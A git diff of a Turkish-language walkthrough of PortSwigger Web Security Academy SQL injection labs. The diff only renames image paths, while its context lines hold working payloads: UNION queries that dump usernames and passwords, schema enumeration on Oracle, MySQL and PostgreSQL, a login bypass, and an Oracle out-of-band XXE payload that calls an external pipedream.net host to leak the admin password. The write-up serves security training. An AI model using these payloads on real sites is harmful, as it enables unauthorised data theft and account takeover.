@@ -8,7 +8,7 @@ Lab ortamı hakkında genel bilgiler bu kısımda verilmiştir.
 
 Lab ortamına eriştiğimizde bizleri bu şekilde bir sayfa karşılamaktadır. Burada ilk baktığımızda UNION base SQL injection tipinde bir açık olabileceğini bilmekteyiz. Çünkü verilerin kesin olarak veritabanından çekilerek sayfada görüntülendiğini görmekteyiz. 
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 1.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-1.png)
 
 Bir saldırı 2 adımdan oluşmaktadır. İlk adım zafiyetin tespiti, ikinci adım ise zafiyetin sömürülmesi adımlarıdır. 
 
@@ -26,7 +26,7 @@ SELECT * FROM x Where y = 'Clothing'''
 
 internal server hatasını çözdüğümüzü görmekteyiz.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 2.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-2.png)
 
 bu tespiti pek tabii ki başka bir yoldan da yapabilirsiniz ancak önemli olan mantığını anlamaktır.
 
@@ -34,7 +34,7 @@ bu tespiti pek tabii ki başka bir yoldan da yapabilirsiniz ancak önemli olan m
 ' and '1'='1
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 3.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-3.png)
 
 yazdığımız değer ile ilk tırnak işaretini escape ettikten sonra kalan tırnak işaretini de geçersiz kılmak için yorum satırı haline getirebilmek için - - işareti koyarız. Ancak bunun gerçekten istediğimiz gibi çalışıp çalışmadığını anlamamız gerekmektedir.
 
@@ -50,7 +50,7 @@ SELECT * FROM x WHERE y = 'accessories' and 1=1--'
 
 Gördüğünüz gibi bu ifadeyi yazmak burada bizim için yeterli oldu.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 4.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-4.png)
 
 Buradaki kaynakta da faydalı sql ipuçlarını bulabilirsiniz: [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
@@ -62,7 +62,7 @@ academy.net/filter?category=Corporat' UNION SELECT null--
 
 parametreden sonra bu şekilde bir ifade yazdığımızda tekrar hata almaktayız. kolon sayılarının eşit olmamasından dolayı oluşan bir hatadır bu. 
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 5.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-5.png)
 
 UNION ifadesinden sonraki SELECT sorgusunda kolon sayısını ikiye çıkardığımızda hatanın çözüldüğünü görmekteyiz. Dolayısıyla kolon sayısını da bulmuş olduk.
 
@@ -70,7 +70,7 @@ UNION ifadesinden sonraki SELECT sorgusunda kolon sayısını ikiye çıkardığ
 academy.net/filter?category=Corporat' UNION SELECT null,null--
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 6.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-6.png)
 
 Bizden önceki SELECT sorgusundan herhangi bir veri gelmemesi için de o kısma alakasız bir değer vererek veri gelmesini önleyebiliriz, bu sayede sadece istediğimiz verilerin gelmesini sağlayarak daha temiz bir sayfa üzerinde çalışabiliriz.
 
@@ -78,7 +78,7 @@ Bizden önceki SELECT sorgusundan herhangi bir veri gelmemesi için de o kısma 
 academy.net/filter?category=alakasizbirdeger' UNION SELECT null,null--
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 7.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-7.png)
 
 lab ortamında bizden ‘users’ tablosundaki ‘username’ ve ‘password’ alanlarını getirmemiz istenmişti. Dolayısıyla null yerine bu kolonları yazıp sonuçları getirebiliriz.
 
@@ -86,11 +86,11 @@ lab ortamında bizden ‘users’ tablosundaki ‘username’ ve ‘password’ 
 academy.net/filter?category=alakasizbirdeger' UNION SELECT username,password FROM users--
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 8.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-8.png)
 
 Görmüş olduğunuz üzere veritabanındaki kayıtları getirebilmiş olduk. Bu şekilde administrator hesabıyla giriş yaptığımızda lab ortamı çözülmüş olacaktır.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 9.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-9.png)
 
 # Lab: SQL injection UNION attack, retrieving multiple values in a single column
 
@@ -106,7 +106,7 @@ Burada uygulamamızın hangi kolonundaki veriyi ekrana yazdırdığını tespit 
 academy.net/filter?category=yenialakasizbirdeger' UNION SELECT null,'ilker' FROM users--
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 10.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-10.png)
 
 Burada ‘ilker’ yazdığımız yerde farklı tabloların çıktılarını birleştirmemiz gerektiği için bu işlemi yapmalıyız. Bu şekilde ilerlediğimizde CONCAT ile birleştirme işlemini yapıp sonuçları getirebiliriz. 
 
@@ -114,21 +114,21 @@ Burada ‘ilker’ yazdığımız yerde farklı tabloların çıktılarını bir
 academy.net/filter?category=olmayanbirsonuc' UNION SELECT null,CONCAT(username,':::ilker:::',password) FROM users--
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 11.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-11.png)
 
 Sonuç olarak bu bilgiler ışığında administrator olarak giriş yaptığımızda lab çözülmüş olmaktadır :)
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 12.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-12.png)
 
 # Lab: SQL injection attack, querying the database type and version on Oracle
 
 Sıradaki SQL Injection lab ortamına erişiyoruz.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 13.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-13.png)
 
 Burada da SQL açığının varlığını tespit edebiliriz kolaylıkla.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 14.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-14.png)
 
 kolon tiplerinde hata almamak için Oracle veritabanında da null kullanabiliriz.
 
@@ -136,7 +136,7 @@ kolon tiplerinde hata almamak için Oracle veritabanında da null kullanabiliriz
 ' UNION SELECT null,null FROM dual--
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 15.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-15.png)
 
 Ekrana yazılan kolonun da 2. kolon olduğunu bu şekilde tespit etmekteyiz.
 
@@ -144,7 +144,7 @@ Ekrana yazılan kolonun da 2. kolon olduğunu bu şekilde tespit etmekteyiz.
 ' UNION SELECT null,'ilker' FROM dual--
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 16.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-16.png)
 
 Oracle veritabanında versiyon bilgisini öğrenmek için de yukarıda paylaştığımız cheat sheet’te görebileceğiniz üzere bu şekilde bir sorgu yazmamız gerekmektedir.
 
@@ -154,13 +154,13 @@ Oracle veritabanında versiyon bilgisini öğrenmek için de yukarıda paylaşt�
 
 Bu sorguyu yaptığımızda da lab’ın çözüldüğünü görebiliriz.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 17.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-17.png)
 
 # Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
 
 Sıradaki lab için de yine versiyon bilgisini öğrenmemiz istenmektedir. 
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 18.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-18.png)
 
 Burada yapacağımız şey ise önceki saldırılardan farklı olarak yorum satırı yapmak için ‘--’ ifadesini kullanmak yerine ‘#’ kullanmaktır. Versiyon bilgisini getirmek için de ‘@@version’ ifadesini kullanmalıyız. Ayrıca ‘#’ ifadesinin tarayıcı tarafından location hash olarak algılanmaması için de encode ederek ‘%23’ şeklinde yazmamız gerekmektedir.
 
@@ -170,11 +170,11 @@ mdisec' UNION SELECT null,@@version%23
 
 ve lab çözüldü…
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 19.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-19.png)
 
 # Lab: SQL injection attack, listing the database contents on non-Oracle databases
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 20.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-20.png)
 
 Bu lab ortamında da  ‘username’ ve ‘password’ bilgilerini tutan tabloyu okuyarak administrator kullanıcısı için gerekli bilgileri öğrendikten sonra bu kullanıcı ile giriş yapmamız istenmektedir. Veritabanının da Oracle olmadığını görmekteyiz.
 
@@ -184,7 +184,7 @@ Bu lab ortamında da  ‘username’ ve ‘password’ bilgilerini tutan tabloyu
 mdisec' UNION SELECT null,null -- asdf
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 21.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-21.png)
 
 Veritabanındaki tabloları getirmek için de PostgreSQL için bu şekilde bir sorgu yazmamız gerekiyor. Tekrar hatırlatmış olalım, sonundaki “-- asdf” ifadesini veritabanı sorgusundaki kalan kısmı command out yapmak için yani yorum satırı yaparak geçersiz kılmak için ekledik. “table_name” değerini de veritabanı 2. kolonu ekrana yazdırdığı için ikinci kolona verdik. 
 
@@ -192,7 +192,7 @@ Veritabanındaki tabloları getirmek için de PostgreSQL için bu şekilde bir s
 mdisec' UNION SELECT null,table_name FROM information_schema.tables -- asdf
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 22.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-22.png)
 
 Burada birçok tablo ismi gelmekte olduğu için bizim için gereksiz olan tabloların gelmemesini sağlamalıyız. Bunun için SQL sorgumuzda bir WHERE ibaresi koyarak gerekli tabloları getirebiliriz. Bunun nasıl yapıldığını bilmiyorsak da internette basit bir araştırma ile bulabiliriz.
 
@@ -200,7 +200,7 @@ Burada birçok tablo ismi gelmekte olduğu için bizim için gereksiz olan tablo
 mdisec' UNION SELECT null,table_name FROM information_schema.tables WHERE table_schema=current_schema() -- asdf
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 23.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-23.png)
 
 Bu kısımdan sonra da “users_nmvfut” için tablo kolon isimlerini öğrenmemiz gerekiyor. 
 
@@ -208,7 +208,7 @@ Bu kısımdan sonra da “users_nmvfut” için tablo kolon isimlerini öğrenme
 mdisec' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users_nmvfut' -- addf
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 24.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-24.png)
 
 ```html
 gelen sonuçları not ediyoruz:
@@ -229,17 +229,17 @@ mdisec' UNION SELECT null, concat(username_obdlzx,':::ilker:::',password_ugssmd)
 
 Bu şekilde sorgumuzu SQL Injection güvenlik açığı sayesinde web uygulamasında çalıştırdığımızda istediğimiz sonuçları artık alabiliyoruz.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 25.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-25.png)
 
 Ve son olarak administrator hesabıyla giriş yaptığımızda lab çözülmüş oluyor…
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 26.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-26.png)
 
 # Lab: SQL injection attack, listing the database contents on Oracle
 
 Bu lab ortamında da Oracle veritabanında benzer şeyleri yapmamız istenmektedir.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 27.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-27.png)
 
 Burada da başlangıçta parametre kısmına bu ifadeyi vererek başlayabiliriz.
 
@@ -247,7 +247,7 @@ Burada da başlangıçta parametre kısmına bu ifadeyi vererek başlayabiliriz.
 mdisec' UNION SELECT null,null FROM dual --
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 28.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-28.png)
 
 Daha sonra tablo isimlerini getiriyoruz. Buradaki tablo isimlerini kontrol ettiğimizde kullanıcılarla ilgili olan tablonun “**USERS_XEDOYY**” olduğunu görmekteyiz.
 
@@ -255,7 +255,7 @@ Daha sonra tablo isimlerini getiriyoruz. Buradaki tablo isimlerini kontrol etti�
 mdisec' UNION SELECT table_name,null FROM all_tables --
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 29.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-29.png)
 
 Şimdi de bu tablodan veri çekmeliyiz. Bunun için de bu şekilde ilerleyebiliriz. Burada da kolon isimlerini elde etmekteyiz.
 
@@ -263,7 +263,7 @@ mdisec' UNION SELECT table_name,null FROM all_tables --
 mdisec' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_XEDOYY'--
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 30.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-30.png)
 
 ```python
 Tablo adı ve Kolon isimlerimizi not alıyoruz:
@@ -281,17 +281,17 @@ Bu aşamadan sonra da bu kolonlardaki verileri çekmeye yönelik bir SQL sorgusu
 mdisec' UNION SELECT USERNAME_ZIOPHP,PASSWORD_VDQFLZ FROM USERS_XEDOYY --
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 31.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-31.png)
 
 Buradan artık administrator hesabıyla giriş yaptığımızda lab çözülmüş oluyor.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 32.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-32.png)
 
 # Lab: Blind SQL injection with conditional responses
 
 Sıradaki lab ortamında ise bizden istenen yine administrayor hesabının parolasını öğrenerek giriş yapmamızdır. 
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 33.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-33.png)
 
 Bu lab ortamında Blind SQL injection olduğu için sqlmap gibi hazır araçlar kullanarak deneme yanılma yöntemiyle sonuçlar çıkarılmalıdır. Bu lab çözümü için ayrı bir yazıda ya bu araçları kullanarak ya da kendi python kodumu yazarak bir çözüm sunacağım. 
 
@@ -299,7 +299,7 @@ Bu lab ortamında Blind SQL injection olduğu için sqlmap gibi hazır araçlar 
 
 Sıradaki lab ortamı için araştırmalara başlayalım.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 34.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-34.png)
 
 Lab’a eriştiken sonra herhangi bir ürün detayına tıklayıp oluşan request’leri burpsuite aracıyla incelediğimizde productID ile bağlantılı olan request dikkatimizi çekmektedir.
 
@@ -309,19 +309,19 @@ GET /product?productId=2 HTTP/2
 
 Burada request’i incelediğimizde SQL Injection’ın oluşacağı nokta Cookie’deki TrackingId kısmı olabilir. Yani insert sorgusu işlemindedir. O yüzden de burada Time Based SQL Injection payload’larıını denemeliyiz. Request-Response arasındaki zaman farklarını ölçmeliyiz.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 35.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-35.png)
 
 Time Based SQL Injection payload’larını denediğimizde istediğimiz gibi bir sonuç alamamaktayız. Beklentimiz burada bir delay oluşmasıydı ancak herhangi bir gecikme ya da bekleme oluşmadı.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 36.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-36.png)
 
 Burada aynı zamanda asenkron yapıda SQL Injection da olabilir. Örneğin buradaki amacımız kullanıcının web uygulamasına request gönderip response alması ve bizim de bu alışveriş esnasındaki zaman farkını alarak SQL Injection’ın varlığını tespit etmektir. 
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 37.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-37.png)
 
 Ancak buradaki sistemde sizden alınan request’e direkt olarak response dönülüyor olabilir. Bu esnada arka planda bir adet background job başlatılıyor olabilir. Bu background job da sizden aldığı parametre ile bir iş yapıyor olabilir. Örnek verecek olursak buradaki web uygulamasının sizden aldığı parametreyi bir Queue’ya yazdığını düşünelim. Aynı ortamda bir adet de Worker olduğunu düşünürsek buradaki Worker Queue’dan verileri alıp Insert işlemini yapıyor olabilir. Çok fazla işlem olduğu için bunların hepsini request-response döngüsünde yapmak zordur, bu yüzden işlemleri background job’lar ile halletmek gerekebilir bazı durumlarda. Böyle yapılarda sizin kullandığınız Time Based SQL Injection Payload’ları bir işe yaramamaktadır. Buradaki lab ortamının açıklamasında da böyle bir yapı olduğundan bahsedilmiştir. Örneğin SQL Injection aslında çalışıyor ancak background job bekliyor olabilir. Bu tür durumlarda zaten SQL Injection varsa da tek çözüm noktası bu uygulamanın dışarıdaki bir sistemle iletişim kurmasını sağlamaktır. 
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 38.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-38.png)
 
 Şuan SQL Injection zafiyetinin varlığını ve veritabanı sisteminin ne olduğunu tespit edemediğimiz için başlangıçta Oracle üzerinden denemeler yapalım. Bu kısımdaki yapıdan yararlanacağız. Buradaki yapıda da daha önce ele aldığımız XXE zafiyeti ile alakalı bir konudur. 
 
@@ -331,7 +331,7 @@ SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE roo
 
 Buraya gelirken de anlamamız gereken bir nokta daha bulunmakta. Cookie’de bulunan TrackingId alındıktan sonra ne yapıldığını da bilmeliyiz.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 35.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-35.png)
 
 Gerçek hayattan örnekleri düşünecek olursak TrackingId’nin değeri direkt olarak SELECT sorgularında geçmez, INSERT sorgularında geçmesi daha muhtemeldir. 
 
@@ -351,37 +351,37 @@ Lab ortamında da yapmamız gereken şey temelde bu mantığa dayanmaktadır. Ay
 '||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://https://eo2pbauj182lj8v.m.pipedream.net/"> %25remote%3b]>'),'/l') FROM dual)||'
 ```
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 39.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-39.png)
 
 Request’in başarıyla geldiğini görebiliriz.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 40.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-40.png)
 
 Bu aşamadan sonra da web uygulamasının veritabanındaki username ve password bilgilerini çıkarmamız gerkmektedir. Bunun için de şu şekilde bir sorgulama yapabiliriz;
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 41.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-41.png)
 
 Burada artık password değerini dışarıya çıkarabileceğimiz bir yapı ile devam edelim. 
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 42.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-42.png)
 
  Bu da parolayı başarıyla bulabildiğimizin kanıtı…
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 43.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-43.png)
 
 Ve administrator hesabına giriş yapınca lab artık çözüldü. 
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 44.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-44.png)
 
 # **Lab: SQL injection vulnerability allowing login bypass**
 
 Sıradaki lab ortamında da giriş işlemi yapılırken SQL Injection’dan yararlanıp giriş yapmamız istenmektedir.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 45.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-45.png)
 
 Burada da çok kolay bir şekilde aşağıdaki gibi çözebiliriz.
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 46.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-46.png)
 
 Buradaki programın giriş kontrolü için genel olarak şöyle bir yapı kurduğunu ve buna göre hareket ettiğini düşünebiliriz. Buradaki yapıya göre gelen username ve password değerleri SQL sorgusuna yerleştirilerek doğrudan kontrol edilmektedir. Ancak biz username alanına “administrator’—” ifadesini girdiğimizde kalan kısmın hiçbir önemi kalmaz ve ismi “administrator” olan kişinin parolası doğru olmasa bile girişi gerçekleştirilmiş olur.
 
@@ -426,7 +426,7 @@ SELECT * FROM users WHERE username='administrator'--' AND password='herhangibir�
 
 Lab çözüldü…
 
-![Untitled](Web Security 0x0A Web Security Academy'den Devam E 5d98a1205cb7439db45c8e0570ab118e/Untitled 47.png)
+![Untitled](Web-Security-0x0A-Web-Security-Academy'den-Devam-E-5d98a1205cb7439db45c8e0570ab118e/Untitled-47.png)
 
 ## KAYNAKLAR:
 
